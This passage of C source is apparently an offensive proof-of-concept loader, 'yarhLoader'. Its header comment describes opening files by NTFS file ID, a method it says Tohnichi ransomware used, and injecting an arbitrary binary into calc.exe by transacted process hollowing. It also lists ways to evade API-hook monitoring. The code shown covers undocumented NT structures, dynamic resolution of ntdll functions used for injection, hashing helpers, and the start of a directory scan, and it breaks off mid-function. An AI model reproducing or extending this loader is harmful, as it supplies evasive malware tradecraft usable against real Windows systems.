/*
							   oooo        ooooo                                  .o8
							   `888        `888'                                 "888
oooo    ooo  .oooo.   oooo d8b  888 .oo.    888          .ooooo.   .oooo.    .oooo888   .ooooo.  oooo d8b
 `88.  .8'  `P  )88b  `888""8P  888P"Y88b   888         d88' `88b `P  )88b  d88' `888  d88' `88b `888""8P
  `88..8'    .oP"888   888      888   888   888         888   888  .oP"888  888   888  888ooo888  888
   `888'    d8(  888   888      888   888   888       o 888   888 d8(  888  888   888  888    .o  888
	.8'     `Y888""8o d888b    o888o o888o o888ooooood8 `Y8bod8P' `Y888""8o `Y8bod88P" `Y8bod8P' d888b
.o..P'
`Y8P'
*//*

yarhLoader is an x86/x64 file loader, file reader, and file writer that abuses NTFS File identifiers for file accessibility.
Traditionally any sort of file operation requires the full path to the file in question. However, it is possible to load the
file by its unique file identifier.

IMPORTANT:

		This method was shown to me by Jonas Lyk. It was named 'yarhLoader' because he frequently uses 'yarh' instead
		of 'yes', 'ya', 'yeah', etc. The transacted process hollowing segment was courtesy of my friend Hasherezade.
		Her GitHub offers many examples on how to perform this method of process injection.

		Opening a file by file id isn't completely unheard of. It *appears* to have legitimate uses. However, I have
		not seen this particular method of file reading, writing, executing used before in the wild EXCEPT by Tohnichi Ransomware.
		(REFERENCE TWEET: https://twitter.com/joe4security/status/1407334828501082121)

NOTES:
		PRO: Can read and write a file without needing its full file path.
		CON: Requires parent directory
		RESOLUTION: Recursively search entire volume

		CON: File IDs cannot be hardcoded. They're different on everyones machine.
		PRO: Once a file is assigned a file ID it never changes.
		CON: A string comparison must be performed to get the file ID (IE is this the right file?)
		RESOLUTION: Can be mitigated by hashing the file name string

		NOTE: I was unable to execute a binary from its FILE ID, may be possible with additional experimentation
		RESOLUTION: Process injection
		
		CON: Requires many NTAPI functions to resolve the FILE ID correctly
		PRO: Can use "GetFileInformationByHandleEx" to get the FILE ID
		CON: Kernel32.dll contains many API forwards, can be easily hooked
		RESOLUTION: Use NTAPI exclusively, use SYSCALLs

		CON: This code uses "OpenFileById" kernel32.dll function
		RESOLUTION: OpenFileById forwards to NtCreateFile, use the API forward

		CON: This code uses CreateProcessW
		RESOLUTION: Use NtCreateProcess
		
		NOTE: In this code example I used many NTAPI functions to demonstrate how this *could* look in malware
		NOTE: This code does not resolve NTDLL via the PEB, it does not use SYSCALLs. It does not mitigate API hooks
		

HOW TO USE THIS:

		This code dynamically assembles C:\Windows\System32 directory. It searches System32 for the unique file hash
		passed to the YarhLoader function. This code uses HashStringFowlerNollVoVariant1aW for string hashing.

		In this code proof of concept it searches for a binary titled "Dispose.exe" in System32. Once it finds Dispose
		it launches calc.exe and uses transacted process hollowing to inject Dispose.exe into calc.exe.

		You can place any binary in System32 as long as it is named Dispose.exe. Alternatively, you can use
		HashStringFowlerNollVoVariant1aW to generate your own hash (on this proof of concept) to create your own
		file name hash.

		ULONG Hash = HashStringFowlerNollVoVariant1aW((PWCHAR)L"MyFileNameHereWithExtension.exe");

		Ive compiled this using Visual Studio 2019. I have 0 errors and 0 warnings.

WHY SYSTEM32:

		Experimenting. You cannot write to files in System32 if you're running at medium integrity/non admin.
		I was curious if I could mitigate this. I could not. Feel free to use any directory. It does not matter.

-smelly
*/


#include <Windows.h>
#define WIN32_LEAN_AND_MEAN

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#define STATUS_SUCCESS 0
#define ERROR_FAILURE_NULL_BUFFER 0
#define STATUS_NO_MORE_FILES 0x80000006
#define WMAX_PATH (MAX_PATH * sizeof(WCHAR))
#define OBJ_CASE_INSENSITIVE 0x00000040
#define FILE_OPEN 0x00000001
#define FILE_OPEN_IF 0x00000003
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020

typedef enum _SECTION_INHERIT
{
	ViewShare = 1,
	ViewUnmap = 2

} SECTION_INHERIT;

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;

typedef struct _LDR_MODULE {
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
	PVOID                   BaseAddress;
	PVOID                   EntryPoint;
	ULONG                   SizeOfImage;
	UNICODE_STRING          FullDllName;
	UNICODE_STRING          BaseDllName;
	ULONG                   Flags;
	SHORT                   LoadCount;
	SHORT                   TlsIndex;
	LIST_ENTRY              HashTableEntry;
	ULONG                   TimeDateStamp;
} LDR_MODULE, * PLDR_MODULE;

typedef struct _PEB_LDR_DATA {
	ULONG                   Length;
	ULONG                   Initialized;
	PVOID                   SsHandle;
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB {
	BOOLEAN                 InheritedAddressSpace;
	BOOLEAN                 ReadImageFileExecOptions;
	BOOLEAN                 BeingDebugged;
	BOOLEAN                 Spare;
	HANDLE                  Mutant;
	PVOID                   ImageBase;
	PPEB_LDR_DATA           LoaderData;
	PVOID                   ProcessParameters;
	PVOID                   SubSystemData;
	PVOID                   ProcessHeap;
	PVOID                   FastPebLock;
	PVOID                   FastPebLockRoutine;
	PVOID                   FastPebUnlockRoutine;
	ULONG                   EnvironmentUpdateCount;
	PVOID*					KernelCallbackTable;
	PVOID                   EventLogSection;
	PVOID                   EventLog;
	PVOID                   FreeList;
	ULONG                   TlsExpansionCounter;
	PVOID                   TlsBitmap;
	ULONG                   TlsBitmapBits[0x2];
	PVOID                   ReadOnlySharedMemoryBase;
	PVOID                   ReadOnlySharedMemoryHeap;
	PVOID* ReadOnlyStaticServerData;
	PVOID                   AnsiCodePageData;
	PVOID                   OemCodePageData;
	PVOID                   UnicodeCaseTableData;
	ULONG                   NumberOfProcessors;
	ULONG                   NtGlobalFlag;
	BYTE                    Spare2[0x4];
	LARGE_INTEGER           CriticalSectionTimeout;
	ULONG                   HeapSegmentReserve;
	ULONG                   HeapSegmentCommit;
	ULONG                   HeapDeCommitTotalFreeThreshold;
	ULONG                   HeapDeCommitFreeBlockThreshold;
	ULONG                   NumberOfHeaps;
	ULONG                   MaximumNumberOfHeaps;
	PVOID**					ProcessHeaps;
	PVOID                   GdiSharedHandleTable;
	PVOID                   ProcessStarterHelper;
	PVOID                   GdiDCAttributeList;
	PVOID                   LoaderLock;
	ULONG                   OSMajorVersion;
	ULONG                   OSMinorVersion;
	ULONG                   OSBuildNumber;
	ULONG                   OSPlatformId;
	ULONG                   ImageSubSystem;
	ULONG                   ImageSubSystemMajorVersion;
	ULONG                   ImageSubSystemMinorVersion;
	ULONG                   GdiHandleBuffer[0x22];
	ULONG                   PostProcessInitRoutine;
	ULONG                   TlsExpansionBitmap;
	BYTE                    TlsExpansionBitmapBits[0x80];
	ULONG                   SessionId;
} PEB, * PPEB;

typedef struct __CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
}CLIENT_ID, * PCLIENT_ID;

typedef PVOID PACTIVATION_CONTEXT;

typedef struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME {
	struct __RTL_ACTIVATION_CONTEXT_STACK_FRAME* Previous;
	PACTIVATION_CONTEXT ActivationContext;
	ULONG Flags;
} RTL_ACTIVATION_CONTEXT_STACK_FRAME, * PRTL_ACTIVATION_CONTEXT_STACK_FRAME;

typedef struct _ACTIVATION_CONTEXT_STACK {
	PRTL_ACTIVATION_CONTEXT_STACK_FRAME ActiveFrame;
	LIST_ENTRY FrameListCache;
	ULONG Flags;
	ULONG NextCookieSequenceNumber;
	ULONG StackId;
} ACTIVATION_CONTEXT_STACK, * PACTIVATION_CONTEXT_STACK;

typedef struct _GDI_TEB_BATCH {
	ULONG Offset;
	ULONG HDC;
	ULONG Buffer[310];
} GDI_TEB_BATCH, * PGDI_TEB_BATCH;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT {
	ULONG Flags;
	PCHAR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, * PTEB_ACTIVE_FRAME_CONTEXT;

typedef struct _TEB_ACTIVE_FRAME {
	ULONG Flags;
	struct _TEB_ACTIVE_FRAME* Previous;
	PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, * PTEB_ACTIVE_FRAME;

typedef struct _TEB
{
	NT_TIB				NtTib;
	PVOID				EnvironmentPointer;
	CLIENT_ID			ClientId;
	PVOID				ActiveRpcHandle;
	PVOID				ThreadLocalStoragePointer;
	PPEB				ProcessEnvironmentBlock;
	ULONG               LastErrorValue;
	ULONG               CountOfOwnedCriticalSections;
	PVOID				CsrClientThread;
	PVOID				Win32ThreadInfo;
	ULONG               User32Reserved[26];
	ULONG               UserReserved[5];
	PVOID				WOW32Reserved;
	LCID                CurrentLocale;
	ULONG               FpSoftwareStatusRegister;
	PVOID				SystemReserved1[54];
	LONG                ExceptionCode;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PACTIVATION_CONTEXT_STACK* ActivationContextStackPointer;
	UCHAR                  SpareBytes1[0x30 - 3 * sizeof(PVOID)];
	ULONG                  TxFsContext;
#elif (NTDDI_VERSION >= NTDDI_WS03)
	PACTIVATION_CONTEXT_STACK ActivationContextStackPointer;
	UCHAR                  SpareBytes1[0x34 - 3 * sizeof(PVOID)];
#else
	ACTIVATION_CONTEXT_STACK ActivationContextStack;
	UCHAR                  SpareBytes1[24];
#endif
	GDI_TEB_BATCH			GdiTebBatch;
	CLIENT_ID				RealClientId;
	PVOID					GdiCachedProcessHandle;
	ULONG                   GdiClientPID;
	ULONG                   GdiClientTID;
	PVOID					GdiThreadLocalInfo;
	PSIZE_T					Win32ClientInfo[62];
	PVOID					glDispatchTable[233];
	PSIZE_T					glReserved1[29];
	PVOID					glReserved2;
	PVOID					glSectionInfo;
	PVOID					glSection;
	PVOID					glTable;
	PVOID					glCurrentRC;
	PVOID					glContext;
	NTSTATUS                LastStatusValue;
	UNICODE_STRING			StaticUnicodeString;
	WCHAR                   StaticUnicodeBuffer[261];
	PVOID					DeallocationStack;
	PVOID					TlsSlots[64];
	LIST_ENTRY				TlsLinks;
	PVOID					Vdm;
	PVOID					ReservedForNtRpc;
	PVOID					DbgSsReserved[2];
#if (NTDDI_VERSION >= NTDDI_WS03)
	ULONG                   HardErrorMode;
#else
	ULONG                  HardErrorsAreDisabled;
#endif
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PVOID					Instrumentation[13 - sizeof(GUID) / sizeof(PVOID)];
	GUID                    ActivityId;
	PVOID					SubProcessTag;
	PVOID					EtwLocalData;
	PVOID					EtwTraceData;
#elif (NTDDI_VERSION >= NTDDI_WS03)
	PVOID					Instrumentation[14];
	PVOID					SubProcessTag;
	PVOID					EtwLocalData;
#else
	PVOID					Instrumentation[16];
#endif
	PVOID					WinSockData;
	ULONG					GdiBatchCount;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	BOOLEAN                SpareBool0;
	BOOLEAN                SpareBool1;
	BOOLEAN                SpareBool2;
#else
	BOOLEAN                InDbgPrint;
	BOOLEAN                FreeStackOnTermination;
	BOOLEAN                HasFiberData;
#endif
	UCHAR                  IdealProcessor;
#if (NTDDI_VERSION >= NTDDI_WS03)
	ULONG                  GuaranteedStackBytes;
#else
	ULONG                  Spare3;
#endif
	PVOID				   ReservedForPerf;
	PVOID				   ReservedForOle;
	ULONG                  WaitingOnLoaderLock;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PVOID				   SavedPriorityState;
	ULONG_PTR			   SoftPatchPtr1;
	ULONG_PTR			   ThreadPoolData;
#elif (NTDDI_VERSION >= NTDDI_WS03)
	ULONG_PTR			   SparePointer1;
	ULONG_PTR              SoftPatchPtr1;
	ULONG_PTR              SoftPatchPtr2;
#else
	Wx86ThreadState        Wx86Thread;
#endif
	PVOID* TlsExpansionSlots;
#if defined(_WIN64) && !defined(EXPLICIT_32BIT)
	PVOID                  DeallocationBStore;
	PVOID                  BStoreLimit;
#endif
	ULONG                  ImpersonationLocale;
	ULONG                  IsImpersonating;
	PVOID                  NlsCache;
	PVOID                  pShimData;
	ULONG                  HeapVirtualAffinity;
	HANDLE                 CurrentTransactionHandle;
	PTEB_ACTIVE_FRAME      ActiveFrame;
#if (NTDDI_VERSION >= NTDDI_WS03)
	PVOID FlsData;
#endif
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PVOID PreferredLangauges;
	PVOID UserPrefLanguages;
	PVOID MergedPrefLanguages;
	ULONG MuiImpersonation;
	union
	{
		struct
		{
			USHORT SpareCrossTebFlags : 16;
		};
		USHORT CrossTebFlags;
	};
	union
	{
		struct
		{
			USHORT DbgSafeThunkCall : 1;
			USHORT DbgInDebugPrint : 1;
			USHORT DbgHasFiberData : 1;
			USHORT DbgSkipThreadAttach : 1;
			USHORT DbgWerInShipAssertCode : 1;
			USHORT DbgIssuedInitialBp : 1;
			USHORT DbgClonedThread : 1;
			USHORT SpareSameTebBits : 9;
		};
		USHORT SameTebFlags;
	};
	PVOID TxnScopeEntercallback;
	PVOID TxnScopeExitCAllback;
	PVOID TxnScopeContext;
	ULONG LockCount;
	ULONG ProcessRundown;
	ULONG64 LastSwitchTime;
	ULONG64 TotalSwitchOutTime;
	LARGE_INTEGER WaitReasonBitMap;
#else
	BOOLEAN SafeThunkCall;
	BOOLEAN BooleanSpare[3];
#endif
} TEB, * PTEB;

typedef enum _FILE_INFORMATION_CLASS {
	FileDirectoryInformation = 1,
	FileFullDirectoryInformation,                   // 2
	FileBothDirectoryInformation,                   // 3
	FileBasicInformation,                           // 4
	FileStandardInformation,                        // 5
	FileInternalInformation,                        // 6
	FileEaInformation,                              // 7
	FileAccessInformation,                          // 8
	FileNameInformation,                            // 9
	FileRenameInformation,                          // 10
	FileLinkInformation,                            // 11
	FileNamesInformation,                           // 12
	FileDispositionInformation,                     // 13
	FilePositionInformation,                        // 14
	FileFullEaInformation,                          // 15
	FileModeInformation,                            // 16
	FileAlignmentInformation,                       // 17
	FileAllInformation,                             // 18
	FileAllocationInformation,                      // 19
	FileEndOfFileInformation,                       // 20
	FileAlternateNameInformation,                   // 21
	FileStreamInformation,                          // 22
	FilePipeInformation,                            // 23
	FilePipeLocalInformation,                       // 24
	FilePipeRemoteInformation,                      // 25
	FileMailslotQueryInformation,                   // 26
	FileMailslotSetInformation,                     // 27
	FileCompressionInformation,                     // 28
	FileObjectIdInformation,                        // 29
	FileCompletionInformation,                      // 30
	FileMoveClusterInformation,                     // 31
	FileQuotaInformation,                           // 32
	FileReparsePointInformation,                    // 33
	FileNetworkOpenInformation,                     // 34
	FileAttributeTagInformation,                    // 35
	FileTrackingInformation,                        // 36
	FileIdBothDirectoryInformation,                 // 37
	FileIdFullDirectoryInformation,                 // 38
	FileValidDataLengthInformation,                 // 39
	FileShortNameInformation,                       // 40
	FileIoCompletionNotificationInformation,        // 41
	FileIoStatusBlockRangeInformation,              // 42
	FileIoPriorityHintInformation,                  // 43
	FileSfioReserveInformation,                     // 44
	FileSfioVolumeInformation,                      // 45
	FileHardLinkInformation,                        // 46
	FileProcessIdsUsingFileInformation,             // 47
	FileNormalizedNameInformation,                  // 48
	FileNetworkPhysicalNameInformation,             // 49
	FileIdGlobalTxDirectoryInformation,             // 50
	FileIsRemoteDeviceInformation,                  // 51
	FileUnusedInformation,                          // 52
	FileNumaNodeInformation,                        // 53
	FileStandardLinkInformation,                    // 54
	FileRemoteProtocolInformation,                  // 55

	//
	//  These are special versions of these operations (defined earlier)
	//  which can be used by kernel mode drivers only to bypass security
	//  access checks for Rename and HardLink operations.  These operations
	//  are only recognized by the IOManager, a file system should never
	//  receive these.
	//

	FileRenameInformationBypassAccessCheck,         // 56
	FileLinkInformationBypassAccessCheck,           // 57

	//
	// End of special information classes reserved for IOManager.
	//

	FileVolumeNameInformation,                      // 58
	FileIdInformation,                              // 59
	FileIdExtdDirectoryInformation,                 // 60
	FileReplaceCompletionInformation,               // 61
	FileHardLinkFullIdInformation,                  // 62
	FileIdExtdBothDirectoryInformation,             // 63
	FileDispositionInformationEx,                   // 64
	FileRenameInformationEx,                        // 65
	FileRenameInformationExBypassAccessCheck,       // 66
	FileDesiredStorageClassInformation,             // 67
	FileStatInformation,                            // 68
	FileMemoryPartitionInformation,                 // 69
	FileStatLxInformation,                          // 70
	FileCaseSensitiveInformation,                   // 71
	FileLinkInformationEx,                          // 72
	FileLinkInformationExBypassAccessCheck,         // 73
	FileStorageReserveIdInformation,                // 74
	FileCaseSensitiveInformationForceAccessCheck,   // 75

	FileMaximumInformation
} FILE_INFORMATION_CLASS, * PFILE_INFORMATION_CLASS;

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG Length;
	PVOID RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
	ULONG         NextEntryOffset;
	ULONG         FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG         FileAttributes;
	ULONG         FileNameLength;
	ULONG         EaSize;
	CCHAR         ShortNameLength;
	WCHAR         ShortName[12];
	LARGE_INTEGER FileId;
	WCHAR         FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, * PFILE_ID_BOTH_DIR_INFORMATION;

typedef enum _THREADINFOCLASS {
	ThreadBasicInformation,
	ThreadTimes,
	ThreadPriority,
	ThreadBasePriority,
	ThreadAffinityMask,
	ThreadImpersonationToken,
	ThreadDescriptorTableEntry,
	ThreadEnableAlignmentFaultFixup,
	ThreadEventPair_Reusable,
	ThreadQuerySetWin32StartAddress,
	ThreadZeroTlsCell,
	ThreadPerformanceCount,
	ThreadAmILastThread,
	ThreadIdealProcessor,
	ThreadPriorityBoost,
	ThreadSetTlsArrayAddress,   // Obsolete
	ThreadIsIoPending,
	ThreadHideFromDebugger,
	ThreadBreakOnTermination,
	ThreadSwitchLegacyState,
	ThreadIsTerminated,
	ThreadLastSystemCall,
	ThreadIoPriority,
	ThreadCycleTime,
	ThreadPagePriority,
	ThreadActualBasePriority,
	ThreadTebInformation,
	ThreadCSwitchMon,          // Obsolete
	ThreadCSwitchPmu,
	ThreadWow64Context,
	ThreadGroupInformation,
	ThreadUmsInformation,      // UMS
	ThreadCounterProfiling,
	ThreadIdealProcessorEx,
	ThreadCpuAccountingInformation,
	MaxThreadInfoClass
} THREADINFOCLASS;

#define PCUNICODE_STRING PUNICODE_STRING

typedef VOID(NTAPI* PIO_APC_ROUTINE)(PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock,ULONG Reserved);
typedef NTSTATUS(NTAPI* NTQUERYDIRECTORYFILE)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS, BOOL, PUNICODE_STRING, BOOL);
typedef NTSTATUS(NTAPI* RTLQUERYENVIRONMENTVARIABLE_U)(PWSTR, PCUNICODE_STRING, PUNICODE_STRING);
typedef NTSTATUS(NTAPI* NTCREATESECTION)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(NTAPI* NTMAPVIEWOFSECTION)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NTUNMAPVIEWOFSECTION)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* NTCREATEFILE)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI* NTOPENFILE)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NTCLOSE)(HANDLE);
typedef NTSTATUS(NTAPI* NTGETCONTEXTTHREAD)(HANDLE, LPCONTEXT);
typedef NTSTATUS(NTAPI* NTSETCONTEXTTHREAD)(HANDLE, LPCONTEXT);
typedef NTSTATUS(NTAPI* NTRESUMETHREAD)(HANDLE, PULONG);
typedef NTSTATUS(NTAPI* NTQUERYINFORMATIONTHREAD)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NTSETINFORMATIONTHREAD)(HANDLE, THREADINFOCLASS, PVOID, ULONG);
typedef NTSTATUS(NTAPI* NTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

typedef ULONG(NTAPI* RTLNTSTATUSTODOSERROR)(NTSTATUS);
typedef PVOID(NTAPI* RTLALLOCATEHEAP)(PVOID, ULONG, SIZE_T);
typedef BOOL(NTAPI* RTLFREEHEAP)(PVOID, ULONG, PVOID);

NTQUERYDIRECTORYFILE NtQueryDirectoryFile = NULL;
NTCREATESECTION NtCreateSection = NULL;
NTMAPVIEWOFSECTION NtMapViewOfSection = NULL;
NTUNMAPVIEWOFSECTION NtUnmapViewOfSection = NULL;
NTCREATEFILE NtCreateFile = NULL;
NTOPENFILE NtOpenFile = NULL;
NTCLOSE NtClose = NULL;
NTGETCONTEXTTHREAD NtGetContextThread = NULL;
NTSETCONTEXTTHREAD NtSetContextThread = NULL;
NTRESUMETHREAD NtResumeThread = NULL;
NTQUERYINFORMATIONTHREAD NtQueryInformationThread = NULL;
NTSETINFORMATIONTHREAD NtSetInformationThread = NULL;
NTWRITEVIRTUALMEMORY NtWriteVirtualMemory = NULL;

RTLQUERYENVIRONMENTVARIABLE_U RtlQueryEnvironmentVariable_U = NULL;
RTLNTSTATUSTODOSERROR RtlNtStatusToDosError = NULL;
RTLALLOCATEHEAP RtlAllocateHeap = NULL;
RTLFREEHEAP RtlFreeHeap = NULL;

HMODULE GlobalNtHandle = NULL;
HANDLE GlobalProcessHeap = NULL;

PTEB GetTeb(VOID)
{
#if defined(_WIN64)
	return (PTEB)__readgsqword(0x30);
#elif define(_WIN32)
	return (PTEB)__readfsdword(0x18);
#endif
}

PPEB Peb;
PTEB Teb;

#define InitializeObjectAttributes(p,n,a,r,s) \
     do { \
         (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
         (p)->RootDirectory = r; \
         (p)->Attributes = a; \
         (p)->ObjectName = n; \
         (p)->SecurityDescriptor = s; \
         (p)->SecurityQualityOfService = NULL; \
     } while (0)


VOID InternalSetLastError(DWORD ErrorCode)
{
	Teb->LastErrorValue = ErrorCode;
	return;
}

DWORD InternalGetLastError(VOID)
{
	return Teb->LastErrorValue;
}

VOID RtlInitEmptyUnicodeString(PUNICODE_STRING UnicodeString, PWCHAR Buffer, USHORT BufferSize)
{
	UnicodeString->Length = 0;
	UnicodeString->MaximumLength = BufferSize;
	UnicodeString->Buffer = Buffer;
}

SIZE_T StringLengthW(LPCWSTR String)
{
	LPCWSTR String2;

	for (String2 = String; *String2; ++String2);

	return (String2 - String);
}

VOID RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString)
{
	SIZE_T DestSize;

	if (SourceString)
	{
		DestSize = StringLengthW(SourceString) * sizeof(WCHAR);
		DestinationString->Length = (USHORT)DestSize;
		DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWCHAR)SourceString;
}

PWCHAR StringCopyW(PWCHAR String1, PWCHAR String2)
{
	PWCHAR p = String1;

	while ((*p++ = *String2++) != 0);

	return String1;
}

PWCHAR StringConcatW(PWCHAR String, PWCHAR String2)
{
	StringCopyW(&String[StringLengthW(String)], String2);

	return String;
}

ULONG HashStringFowlerNollVoVariant1aW(PWCHAR String)
{
	ULONG Hash = 0x811c9dc5;

	while (*String)
	{
		Hash ^= (UCHAR)*String++;
		Hash *= 0x01000193;
	}

	return Hash;
}

BOOL RtlGetEnvironmentVariableAltW(LPCWSTR lpName, LPWSTR lpBuffer, DWORD Length)
{
	UNICODE_STRING EnvironmentVariable = { 0 };
	UNICODE_STRING ReturnedVariable = { 0 };
	NTSTATUS Status = STATUS_SUCCESS;
	BOOL bFlag = TRUE;

	RtlInitUnicodeString(&EnvironmentVariable, lpName);
	
	RtlInitEmptyUnicodeString(&ReturnedVariable, lpBuffer, (USHORT)Length);
	
	Status = RtlQueryEnvironmentVariable_U(NULL, &EnvironmentVariable, &ReturnedVariable);
	if (!NT_SUCCESS(Status))
		bFlag = FALSE;

	if(!bFlag)
		InternalSetLastError(RtlNtStatusToDosError(Status));

	return bFlag;
}

BOOL RtlInitGlobalApplicationData(VOID)
{
	Teb = (PTEB)GetTeb();
	Peb = (PPEB)Teb->ProcessEnvironmentBlock;

	GlobalNtHandle = GetModuleHandleW(L"ntdll.dll");
	if (GlobalNtHandle == NULL)
		return FALSE;

	GlobalProcessHeap = (HANDLE)Peb->ProcessHeap;

	NtQueryDirectoryFile = (NTQUERYDIRECTORYFILE)GetProcAddress(GlobalNtHandle, "NtQueryDirectoryFile");
	NtCreateSection = (NTCREATESECTION)GetProcAddress(GlobalNtHandle, "NtCreateSection");
	NtMapViewOfSection = (NTMAPVIEWOFSECTION)GetProcAddress(GlobalNtHandle, "NtMapViewOfSection");
	NtUnmapViewOfSection = (NTUNMAPVIEWOFSECTION)GetProcAddress(GlobalNtHandle, "NtUnmapViewOfSection");
	RtlNtStatusToDosError = (RTLNTSTATUSTODOSERROR)GetProcAddress(GlobalNtHandle, "RtlNtStatusToDosError");
	NtCreateFile = (NTCREATEFILE)GetProcAddress(GlobalNtHandle, "NtCreateFile");
	NtOpenFile = (NTOPENFILE)GetProcAddress(GlobalNtHandle, "NtOpenFile");
	NtClose = (NTCLOSE)GetProcAddress(GlobalNtHandle, "NtClose");
	NtGetContextThread = (NTGETCONTEXTTHREAD)GetProcAddress(GlobalNtHandle, "NtGetContextThread");
	NtSetContextThread = (NTSETCONTEXTTHREAD)GetProcAddress(GlobalNtHandle, "NtSetContextThread");
	NtResumeThread = (NTRESUMETHREAD)GetProcAddress(GlobalNtHandle, "NtResumeThread");
	NtQueryInformationThread = (NTQUERYINFORMATIONTHREAD)GetProcAddress(GlobalNtHandle, "NtQueryInformationThread");
	NtSetInformationThread = (NTSETINFORMATIONTHREAD)GetProcAddress(GlobalNtHandle, "NtSetInformationThread");
	NtWriteVirtualMemory = (NTWRITEVIRTUALMEMORY)GetProcAddress(GlobalNtHandle, "NtWriteVirtualMemory");

	RtlAllocateHeap = (RTLALLOCATEHEAP)GetProcAddress(GlobalNtHandle, "RtlAllocateHeap");
	RtlFreeHeap = (RTLFREEHEAP)GetProcAddress(GlobalNtHandle, "RtlFreeHeap");
	RtlQueryEnvironmentVariable_U = (RTLQUERYENVIRONMENTVARIABLE_U)GetProcAddress(GlobalNtHandle, "RtlQueryEnvironmentVariable_U");

	if (!NtQueryDirectoryFile || !RtlQueryEnvironmentVariable_U || !NtCreateSection || !NtMapViewOfSection ||
		!NtUnmapViewOfSection || !RtlNtStatusToDosError || !NtCreateFile || !NtOpenFile || !NtClose ||
		!RtlAllocateHeap || !RtlFreeHeap || !NtGetContextThread || !NtSetContextThread || !NtResumeThread ||
		!NtQueryInformationThread || !NtSetInformationThread || !NtWriteVirtualMemory)
	{
		return FALSE;
	}
		
	return TRUE;
}

HANDLE SubroutineNtCreateFile(LPCWSTR lpFilename)
{
	HANDLE Handle = INVALID_HANDLE_VALUE;
	NTSTATUS Status = STATUS_SUCCESS;
	IO_STATUS_BLOCK Io = { 0 };
	OBJECT_ATTRIBUTES Attributes = { 0 };
	UNICODE_STRING UnicodeString = { 0 };

	RtlInitUnicodeString(&UnicodeString, lpFilename);
	InitializeObjectAttributes(&Attributes, &UnicodeString, OBJ_CASE_INSENSITIVE, NULL, NULL);

	Status = NtCreateFile(&Handle, GENERIC_READ | SYNCHRONIZE, &Attributes, &Io, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (!NT_SUCCESS(Status))
		InternalSetLastError(RtlNtStatusToDosError(Status));

	return Handle;
}

HANDLE RtlOpenFileByFileId(HANDLE Volume, LPFILE_ID_DESCRIPTOR FileId, DWORD DesiredAccess, DWORD ShareMode)
{
	return NULL;
}

LONGLONG SubroutineGetNtfsFileId(HANDLE Handle, PLARGE_INTEGER uId, ULONG Hash)
{
	NTSTATUS Status = STATUS_SUCCESS;
	IO_STATUS_BLOCK Io = { 0 };
	PFILE_ID_BOTH_DIR_INFORMATION DirectoryInformation = NULL;
	LONGLONG FileId = 0;

	DirectoryInformation = (PFILE_ID_BOTH_DIR_INFORMATION)RtlAllocateHeap(GlobalProcessHeap, HEAP_ZERO_MEMORY, 0x1000);
	if (DirectoryInformation == NULL)
		return ERROR_FAILURE_NULL_BUFFER;

	while (0 <= (Status = NtQueryDirectoryFile(Handle, NULL, NULL, NULL, &Io, DirectoryInformation, 0x1000, 37, 0, NULL, FALSE)))
	{
